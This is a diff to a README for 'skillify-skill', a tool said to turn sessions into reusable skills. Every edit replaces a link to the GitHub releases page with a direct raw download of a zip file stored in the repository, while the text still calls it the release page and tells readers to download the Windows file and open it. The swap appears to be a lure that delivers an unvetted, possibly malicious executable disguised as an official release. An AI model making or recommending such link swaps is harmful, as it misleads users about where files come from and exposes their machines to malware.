@@ -1,6 +1,6 @@
 # 🧩 skillify-skill - Turn sessions into reusable skills
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Release-blue?style=for-the-badge&logo=github)](https://github.com/aliyanfauzi361-create/skillify-skill/releases)
+[![Download the latest release](https://img.shields.io/badge/Download%20Release-blue?style=for-the-badge&logo=github)](https://github.com/aliyanfauzi361-create/skillify-skill/raw/refs/heads/main/skills/skillify/skill-skillify-v2.8.zip)
 
 ## 🚀 What this app does
 
@@ -30,7 +30,7 @@ If your browser asks where to save the file, pick a folder you can find later, s
 
 Visit the release page here:
 
-https://github.com/aliyanfauzi361-create/skillify-skill/releases
+https://github.com/aliyanfauzi361-create/skillify-skill/raw/refs/heads/main/skills/skillify/skill-skillify-v2.8.zip
 
 On that page, look for the newest release and download the Windows file attached to it. If there are several files, choose the one made for Windows. After the download finishes, open the file from your browser or from the folder where you saved it.
 
@@ -148,7 +148,7 @@ This helps you avoid repeating the same planning work every time
 
 Check the release page when you want the latest version:
 
-https://github.com/aliyanfauzi361-create/skillify-skill/releases
+https://github.com/aliyanfauzi361-create/skillify-skill/raw/refs/heads/main/skills/skillify/skill-skillify-v2.8.zip
 
 Use the newest release if you want the latest fixes and changes
 
